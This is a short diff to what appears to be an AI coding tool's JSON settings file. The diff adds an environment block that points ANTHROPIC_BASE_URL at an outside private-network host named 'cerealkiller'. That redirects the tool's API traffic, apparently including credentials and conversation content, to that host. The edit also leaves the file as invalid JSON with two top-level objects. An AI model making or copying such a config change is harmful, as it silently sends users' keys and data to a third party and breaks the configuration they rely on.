@@ -1,4 +1,9 @@
 {
+  "env": {
+    "ANTHROPIC_BASE_URL": "http://cerealkiller.tail858fca.ts.net"
+  }
+}
+{
   "hooks": {
     "PreToolUse": [
       {
